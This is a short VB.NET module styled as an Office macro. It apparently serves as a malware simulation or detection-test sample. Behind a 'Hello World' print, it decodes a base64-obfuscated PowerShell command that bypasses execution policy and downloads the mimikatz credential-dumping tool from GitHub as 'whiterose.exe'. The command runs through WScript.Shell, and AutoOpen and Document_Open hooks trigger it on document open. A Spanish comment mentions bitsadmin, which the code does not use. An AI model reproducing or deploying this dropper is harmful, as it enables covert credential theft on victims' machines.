Imports System

Module Program
    Private VBA As Object = Nothing
    Sub Main(args As String())
        Console.WriteLine("Hello World!")

        mrrobot()

    End Sub

    Sub mrrobot()

        Dim elliot
        elliot = "cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgdW5yZXN0cmljdGVkIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJd" _
        & "OjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyBJbnZva2UtV2ViUmVxdWVzdCAtT3V0RmlsZSAnd2hpdGVyb3NlLmV" _
        & "4ZScgLXVzZWIgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QYXJyb3RTZWMvbWltaWthdHovbWFzdGVyL1dpbjMyL21pbWlrYXR6LmV4ZSci"

        Dim darlene
        darlene = "C:\Windows\System32\cmd.exe /k " + db64(elliot)

        'Realizamos una descarga con bitsadmin de un ejecutable sospechoso
        Dim shell
        Dim out
        shell = VBA.CreateObject("WScript.Shell")
        out = shell.Run(darlene)

    End Sub

    Sub AutoOpen()
        mrrobot()
    End Sub

    Sub Document_Open()
        mrrobot()
    End Sub

    Public Function db64(input As String) As String
        Return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(input))
    End Function



End Module
